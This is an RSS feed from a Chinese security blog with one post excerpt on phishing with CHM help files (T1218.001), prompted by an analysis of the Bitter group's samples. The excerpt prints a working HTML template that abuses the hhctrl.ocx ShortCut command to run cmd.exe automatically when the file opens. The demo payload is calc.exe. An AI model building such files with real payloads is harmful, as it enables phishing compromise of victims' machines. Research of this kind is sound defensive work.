<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Phishing on 倾旋的博客</title><link>https://payloads.online/tags/phishing/</link><description>Recent content in Phishing on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Mon, 18 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/tags/phishing/index.xml" rel="self" type="application/rss+xml"/><item><title>邮件钓鱼与T1218.001</title><link>https://payloads.online/archivers/2023-09-18/phishing/</link><pubDate>Mon, 18 Sep 2023 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2023-09-18/phishing/</guid><description>背景 今天中午看到一份关于Bitter组织针对亚太地区能源部门发起钓鱼活动分析报告，其中@Ryan Robinson 2023年3月24日对该组织使用的CHM样本进行了分析。于是开始详细了解为什么CHM格式在钓鱼中可以发挥如此大的价值。
CHM文件打开的过程 CHM文件是各种内容的压缩编译，如HTML文档，图像和脚本/Web相关的编程语言，在CHM打开时，会调用IE浏览器的基础组件解析显示,双击打开CHM文件其实本质上是创建了一个hh.exe的进程。
CHM的Payload CHM文件可以通过hh.exe进行反编译：
1 hh.exe -decompile %temp% payload.chm 如何构建CHM文件？ 可以使用Microsoft HTML Help Workshop工具创建CHM文件，FILES指的是目录，OPTIONS指的是文档基本信息：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;OBJECT id=&amp;#34;Test&amp;#34; type=&amp;#34;application/x-oleobject&amp;#34; classid=&amp;#34;clsid:52a2aaae-085d-4187-97ea-8c30db990436&amp;#34; codebase=&amp;#34;hhctrl.ocx#Version=5,02,3790,1194&amp;#34; width=&amp;#34;1&amp;#34; height=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;PARAM name=&amp;#34;Command&amp;#34; value=&amp;#34;ShortCut&amp;#34;&amp;gt; &amp;lt;PARAM name=&amp;#34;Button&amp;#34; value=&amp;#34;Bitmap:shortcut&amp;#34;&amp;gt; &amp;lt;PARAM name=&amp;#34;Item1&amp;#34; value=&amp;#34;,cmd.exe, /c calc.exe&amp;#34;&amp;gt; &amp;lt;PARAM name=&amp;#34;Item2&amp;#34; value=&amp;#34;273,1,1&amp;#34;&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;script&amp;gt; Test.HHClick(); &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Hello&amp;lt;/h1&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 在这段代码中，调用了hhctrl.ocxCOM组件，该组件的方法可以执行命令：
COM组件方法列表：CLSID 52A2AAAE-085D-4187-97EA-8C30DB990436 | HHCtrl Object | STRONTIC</description></item></channel></rss>